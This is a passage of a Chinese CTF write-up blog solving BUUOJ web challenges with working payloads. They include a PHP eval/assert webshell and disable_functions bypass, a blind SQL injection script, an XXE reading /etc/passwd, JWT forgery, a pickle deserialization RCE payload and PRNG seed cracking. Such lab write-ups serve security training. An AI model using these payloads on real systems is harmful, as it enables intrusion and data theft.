punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>取反绕过，先试试phpinfo</p><pre class="line-numbers language-none"><code class="language-none">code&#x3D;(~%8F%97%8F%96%91%99%90)();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>禁用大量系统命令执行函数，构造eval使用蚁剑</p><pre class="line-numbers language-none"><code class="language-none">code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);&#x2F;&#x2F;assert((eval($_POST[a])))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>发现读不到flag，看wp，是一个PHP7的禁用函数绕过漏洞</p><pre class="line-numbers language-none"><code class="language-none">这里用工具地址https:&#x2F;&#x2F;github.com&#x2F;yangyangwithgnu&#x2F;bypass_disablefunc_via_LD_PRELOAD由于在&#x2F;var&#x2F;tmp目录 有上传权限，可以上传bypass_disablefun_x64.so和bypass_disablefunc.php（重命名为shell.php），<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">然后需要构造一个新的payload:根据“?code&#x3D;$&#123;*GET&#125;[_](https:&#x2F;&#x2F;www.cnblogs.com&#x2F;yunqian2017&#x2F;p&#x2F;$&#123;_GET&#125;[_]);&amp;*&#x3D;assert&amp;_&#x3D;eval($_POST[&#39;a&#39;])”使用的是异或绕过，最后的payload是<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;shell.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="MRCTF2020-套娃"   >          <a href="#MRCTF2020-套娃" class="heading-link"><i class="fas fa-link"></i></a><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2>      <p>查看源码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$query &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];if(substr_count($query, &#39;_&#39;) !&#x3D;&#x3D; 0 || substr_count($query, &#39;%5f&#39;) !&#x3D; 0 )&#123;die(&#39;Y0u are So cutE!&#39;);&#125;if($_GET[&#39;b_u_p_t&#39;] !&#x3D;&#x3D; &#39;23333&#39; &amp;&amp; preg_match(&#39;&#x2F;^23333$&#x2F;&#39;, $_GET[&#39;b_u_p_t&#39;]))&#123;echo &quot;you are going to the next ~&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求传参变量名为<code>b_u_p_t</code>又要求队列字符串中不能有下划线，可以使用空格绕过，而匹配起始结尾都要有23333，使用换行绕过</p><pre class="line-numbers language-none"><code class="language-none">?b u p t&#x3D;23333%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源码，发现有brainfuck注释内容，在控制台执行，发现需要POST传参Merak，传入后查看代码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php error_reporting(0); include &#39;takeip.php&#39;;ini_set(&#39;open_basedir&#39;,&#39;.&#39;); include &#39;flag.php&#39;;if(isset($_POST[&#39;Merak&#39;]))&#123;     highlight_file(__FILE__);     die(); &#125; function change($v)&#123;     $v &#x3D; base64_decode($v);     $re &#x3D; &#39;&#39;;     for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123;         $re .&#x3D; chr ( ord ($v[$i]) + $i*2 );     &#125;     return $re; &#125;echo &#39;Local access only!&#39;.&quot;&lt;br&#x2F;&gt;&quot;;$ip &#x3D; getIp();if($ip!&#x3D;&#39;127.0.0.1&#39;)echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ip匹配绕过使用Client-ip请求头，file_get_contents使用data伪协议传入</p><pre class="line-numbers language-none"><code class="language-none">?2333&#x3D;data:text&#x2F;plain,todat is a happy day&amp;file&#x3D;ZmpdYSZmXGI&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源码得到flag</p>        <h2 id="WUSTCTF2020-颜值成绩查询"   >          <a href="#WUSTCTF2020-颜值成绩查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2>      <p>布尔盲注，看这题<a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL">[极客大挑战 2019]FinalSQL</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://e3fad2bd-ba6f-41a9-bb23-275458f3c9ed.node4.buuoj.cn:81/"</span>name<span class="token operator">=</span><span class="token string">",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890"</span>flag<span class="token operator">=</span><span class="token string">"flag&#123;1234567890-bcde&#125;,"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        parma<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">'stunum'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"1*(ascii(substr((select(group_concat(value))from(ctf.flag)),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span>        <span class="token punctuation">&#125;</span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>parma<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"Hi admin, your score is: 100"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="FBCTF2019-RCEService"   >          <a href="#FBCTF2019-RCEService" class="heading-link"><i class="fas fa-link"></i></a><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2>      <p>%0A换行截断绕过</p><pre class="line-numbers language-none"><code class="language-none">payload:cmd&#x3D;&#123;%0A&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0A&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>        <h2 id="Zer0pts2020-Can-you-guess-it"   >          <a href="#Zer0pts2020-Can-you-guess-it" class="heading-link"><i class="fas fa-link"></i></a><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2>      <p>先看源码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpinclude &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.phpif (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;$secret &#x3D; bin2hex(random_bytes(64));if (isset($_POST[&#39;guess&#39;])) &#123;  $guess &#x3D; (string) $_POST[&#39;guess&#39;];  if (hash_equals($secret, $guess)) &#123;    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;  &#125; else &#123;    $message &#x3D; &#39;Wrong.&#39;;  &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用的是<code>basename</code>函数和<code>$_SERVER[&#39;PHP_SELF&#39;]</code></p><p>basename函数会返回路径中的文件名部分，如</p><pre class="line-numbers language-none"><code class="language-none">basename(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;)&#x3D;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>$_SERVER[&#39;PHP_SELF&#39;]</code>返回的是url中文件部分</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;index.phpPHP_SELF内容就是&#x2F;test&#x2F;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>basename函数有一个bug，它会去掉文件名开头的非ASCII值，所以我们构造payload在config.php最后再加一个非ascii字符即可</p><pre class="line-numbers language-none"><code class="language-none">payload:index.php&#x2F;config.php&#x2F;%FF?source<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>        <h2 id="NCTF2019-Fake-XML-cookbook"   >          <a href="#NCTF2019-Fake-XML-cookbook" class="heading-link"><i class="fas fa-link"></i></a><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2>      <p>随意输入用户名密码，抓包发现内容使用xml传输，尝试构造XXE漏洞</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY admin SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&admin;">&amp;admin;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-03" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-03</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 23.20.24.png)</p><p>测试回显成功</p><p>猜测flag在根目录下，拿到flag</p>        <h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"   >          <a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2>      <p>看标题内容，提示要买LV6</p><pre class="line-numbers language-none"><code class="language-none">## 爆破*站：资金募集 11540.0ikun们冲鸭,一定要买到lv6!!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>写个脚本先找到LV6</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://14806839-f3e4-4cb2-8762-4f6d771a95b0.node4.buuoj.cn:81/shop?page="</span>name<span class="token operator">=</span><span class="token string">"static/img/lv/lv6.png"</span>i<span class="token operator">=</span><span class="token number">2</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span> name <span class="token keyword">in</span> tex<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    i<span class="token operator">+=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现在181页</p><p>需要的money<del>太臭了不买了</del>太多了，抓包更改折扣购买，而后提示该页面只允许admin访问，抓包发现JWT，找个<span class="exturl"><a class="exturl__link"   href="https://github.com/brendan-rius/c-jwt-cracker" >脚本</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>爆破密钥</p><p>爆破出的密钥为<code>1Kun</code></p><p>再在<a href="">jwt.io</a>中生成新的jwt</p><pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img   src="https://img-blog.csdnimg.cn/1be8776440c7499882db6dfd0e32d3cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZWxpZm9yc2hhcm9u,size_20,color_FFFFFF,t_70,g_se,x_16" style="width: image/watermark,type_d3F5LXplbmhlaQ,shadow_50,tepx;height: t_Q1NETiBAZWpx;" ></p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-03" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-03</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 23.47.04.png)</p><p>看源码下载文件</p><p>关键内容在sshop/views/Admin.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Admin.py</span><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web<span class="token keyword">from</span> sshop<span class="token punctuation">.</span>base <span class="token keyword">import</span> BaseHandler<span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">AdminHandler</span><span class="token punctuation">(</span>BaseHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token decorator annotation punctuation">@tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated</span>    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>current_user <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'no_ass.html'</span><span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated</span>    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目中提示了pickle，看看这是个什么东西</p><blockquote><p>python的pickle模块实现了基本的数据序列和反序列化</p><div class="table-container"><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>dumps</td><td>对象反序列化为bytes对象</td></tr><tr><td>dump</td><td>对象反序列化到文件对象，存入文件</td></tr><tr><td>loads</td><td>从bytes对象反序列化</td></tr><tr><td>load</td><td>对象反序列化，从文件中读取数据</td></tr></tbody></table></div></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#文件</span><span class="token comment">#序列化</span>pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token punctuation">)</span>obj表示要进行封装的对象<span class="token punctuation">(</span>必填参数）<span class="token builtin">file</span>表示obj要写入的文件对象以二进制可写模式打开即wb<span class="token punctuation">(</span>必填参数）<span class="token comment">#反序列化</span>pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"ASCII"</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">"strict"</span><span class="token punctuation">,</span> buffers<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token builtin">file</span>文件中读取封存后的对象以二进制可读模式打开即rb<span class="token punctuation">(</span>必填参数<span class="token punctuation">)</span><span class="token comment">#对象</span><span class="token comment">#序列化</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">,</span>fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>dumps<span class="token punctuation">(</span><span class="token punctuation">)</span>方法不需要写入文件中，直接返回一个序列化的<span class="token builtin">bytes</span>对象。<span class="token comment">#反序列化</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>bytes_object<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span>fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"ASCII"</span><span class="token punctuation">.</span> errors<span class="token operator">=</span><span class="token string">"strict"</span><span class="token punctuation">)</span>loads<span class="token punctuation">(</span><span class="token punctuation">)</span>方法是直接从<span class="token builtin">bytes</span>对象中读取序列化的信息，而非从文件中读取。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查找后得知<span class="exturl"><a class="exturl__link"   href="https://www.freebuf.com/articles/web/252189.html" >pickle反序列化漏洞</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><blockquote><p>简而言之，pickle的loads在进行反序列化的时候会调用<code>__reduce__</code>魔术方法，也就可以利用该魔术方法构造payload</p></blockquote><p>命令执行例子</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">Test2</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#被调用函数的参数</span>        cmd <span class="token operator">=</span> <span class="token string">"/usr/bin/id"</span>         <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    test <span class="token operator">=</span> Test2<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#执行序列化操作</span>    result1 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>test<span class="token punctuation">)</span>    <span class="token comment">#执行反序列化操作</span>    result2 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>result1<span class="token punctuation">)</span><span class="token comment"># __reduce__()魔法方法的返回值:</span><span class="token comment"># return(os.system,(cmd,))</span><span class="token comment"># 1.满足返回一个元组，元组中有两个参数</span><span class="token comment"># 2.第一个参数是被调用函数 : os.system()</span><span class="token comment"># 3.第二个参数是一个元组:(cmd,),元组中被调用的参数 cmd</span><span class="token comment"># 4. 因此序列化时被解析执行的代码是 os.system("/usr/bin/id")</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么就来构造个payload吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#python2</span><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span> a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提交即可</p>        <h2 id="GWCTF-2019-枯燥的抽奖"   >          <a href="#GWCTF-2019-枯燥的抽奖" class="heading-link"><i class="fas fa-link"></i></a><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2>      <p>源码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php #这不是抽奖程序的源代码！不许看！ header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;); session_start(); if(!isset($_SESSION[&#39;seed&#39;]))&#123; $_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999); &#125; mt_srand($_SESSION[&#39;seed&#39;]); $str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $str&#x3D;&#39;&#39;; $len1&#x3D;20; for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;     $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);        &#125; $str_show &#x3D; substr($str, 0, 10); echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;; if(isset($_POST[&#39;num&#39;]))&#123;     if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x         echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;     &#125;     else&#123;         echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;;     &#125; &#125; show_source(&quot;check.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>伪随机数漏洞，先算出需要的随机数吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>key <span class="token operator">=</span> <span class="token string">'S5KnjyVcrs'</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            m <span class="token operator">+=</span> <span class="token string">"&#123;&#125; &#123;&#125; 0 &#123;&#125; "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" 